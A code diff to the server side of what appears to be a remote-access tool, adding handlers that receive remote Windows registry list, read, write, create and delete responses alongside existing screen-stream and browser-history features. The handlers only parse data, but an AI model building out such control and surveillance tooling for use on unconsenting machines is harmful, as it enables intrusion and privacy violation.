@@ -138,6 +138,18 @@ class ClientHandler:
             self._process_screen_stream_frame()
         elif cmd == CMD_BROWSER_HISTORY_RESPONSE:
             self._process_browser_history_response()
+        elif cmd == CMD_REGISTRY_LIST_RESPONSE:
+            self._process_registry_list_response()
+        elif cmd == CMD_REGISTRY_READ_RESPONSE:
+            self._process_registry_read_response()
+        elif cmd == CMD_REGISTRY_WRITE_RESPONSE:
+            self._process_registry_write_response()
+        elif cmd == CMD_REGISTRY_DELETE_VALUE_RESPONSE:
+            self._process_registry_delete_value_response()
+        elif cmd == CMD_REGISTRY_CREATE_KEY_RESPONSE:
+            self._process_registry_create_key_response()
+        elif cmd == CMD_REGISTRY_DELETE_KEY_RESPONSE:
+            self._process_registry_delete_key_response()
         else:
             if cmd > 100:  # Assumimos que comandos acima de 100 podem ser dados de arquivo
                 pass  # Silenciosamente ignorar
@@ -787,3 +799,132 @@ class ClientHandler:
                 self.log("Servidor não possui window_manager para processar histórico")
         except Exception as e:
             self.log(f"Erro ao processar resposta de histórico: {str(e)}")
+    def _process_registry_list_response(self):
+        self.log("Receiving registry list response")
+        size_data = self._recv_exact(4)
+        if not size_data:
+            self.log("Error receiving registry list response size")
+            return
+        data_size = struct.unpack('>I', size_data)[0]
+        if data_size <= 0:
+            self.log(f"Invalid registry list response size: {data_size} bytes")
+            return
+        if data_size > 10 * 1024 * 1024:  # Limit to 10MB
+            self.log(f"Registry list response too large: {data_size / 1024 / 1024:.2f} MB")
+            return
+        data = self._recv_exact(data_size)
+        if not data:
+            self.log("Error receiving registry list response data")
+            return
+        try:
+            if hasattr(self.server, 'window_manager') and self.server.window_manager:
+                self.server.window_manager.process_registry_list_response(self.client_address, data)
+            else:
+                self.log("Server has no window_manager to process registry list response")
+        except Exception as e:
+            self.log(f"Error processing registry list response: {str(e)}")
+    def _process_registry_read_response(self):
+        self.log("Receiving registry read response")
+        size_data = self._recv_exact(4)
+        if not size_data:
+            self.log("Error receiving registry read response size")
+            return
+        data_size = struct.unpack('>I', size_data)[0]
+        if data_size <= 0:
+            self.log(f"Invalid registry read response size: {data_size} bytes")
+            return
+        data = self._recv_exact(data_size)
+        if not data:
+            self.log("Error receiving registry read response data")
+            return
+        try:
+            if hasattr(self.server, 'window_manager') and self.server.window_manager:
+                self.server.window_manager.process_registry_read_response(self.client_address, data)
+            else:
+                self.log("Server has no window_manager to process registry read response")
+        except Exception as e:
+            self.log(f"Error processing registry read response: {str(e)}")
+    def _process_registry_write_response(self):
+        self.log("Receiving registry write response")
+        size_data = self._recv_exact(4)
+        if not size_data:
+            self.log("Error receiving registry write response size")
+            return
+        data_size = struct.unpack('>I', size_data)[0]
+        if data_size <= 0:
+            self.log(f"Invalid registry write response size: {data_size} bytes")
+            return
+        data = self._recv_exact(data_size)
+        if not data:
+            self.log("Error receiving registry write response data")
+            return
+        try:
+            if hasattr(self.server, 'window_manager') and self.server.window_manager:
+                self.server.window_manager.process_registry_write_response(self.client_address, data)
+            else:
+                self.log("Server has no window_manager to process registry write response")
+        except Exception as e:
+            self.log(f"Error processing registry write response: {str(e)}")
+    def _process_registry_delete_value_response(self):
+        self.log("Receiving registry delete value response")
+        size_data = self._recv_exact(4)
+        if not size_data:
+            self.log("Error receiving registry delete value response size")
+            return
+        data_size = struct.unpack('>I', size_data)[0]
+        if data_size <= 0:
+            self.log(f"Invalid registry delete value response size: {data_size} bytes")
+            return
+        data = self._recv_exact(data_size)
+        if not data:
+            self.log("Error receiving registry delete value response data")
+            return
+        try:
+            if hasattr(self.server, 'window_manager') and self.server.window_manager:
+                self.server.window_manager.process_registry_delete_value_response(self.client_address, data)
+            else:
+                self.log("Server has no window_manager to process registry delete value response")
+        except Exception as e:
+            self.log(f"Error processing registry delete value response: {str(e)}")
+    def _process_registry_create_key_response(self):
+        self.log("Receiving registry create key response")
+        size_data = self._recv_exact(4)
+        if not size_data:
+            self.log("Error receiving registry create key response size")
+            return
+        data_size = struct.unpack('>I', size_data)[0]
+        if data_size <= 0:
+            self.log(f"Invalid registry create key response size: {data_size} bytes")
+            return
+        data = self._recv_exact(data_size)
+        if not data:
+            self.log("Error receiving registry create key response data")
+            return
+        try:
+            if hasattr(self.server, 'window_manager') and self.server.window_manager:
+                self.server.window_manager.process_registry_create_key_response(self.client_address, data)
+            else:
+                self.log("Server has no window_manager to process registry create key response")
+        except Exception as e:
+            self.log(f"Error processing registry create key response: {str(e)}")
+    def _process_registry_delete_key_response(self):
+        self.log("Receiving registry delete key response")
+        size_data = self._recv_exact(4)
+        if not size_data:
+            self.log("Error receiving registry delete key response size")
+            return
+        data_size = struct.unpack('>I', size_data)[0]
+        if data_size <= 0:
+            self.log(f"Invalid registry delete key response size: {data_size} bytes")
+            return
+        data = self._recv_exact(data_size)
+        if not data:
+            self.log("Error receiving registry delete key response data")
+            return
+        try:
+            if hasattr(self.server, 'window_manager') and self.server.window_manager:
+                self.server.window_manager.process_registry_delete_key_response(self.client_address, data)
+            else:
+                self.log("Server has no window_manager to process registry delete key response")
+        except Exception as e:
+            self.log(f"Error processing registry delete key response: {str(e)}")
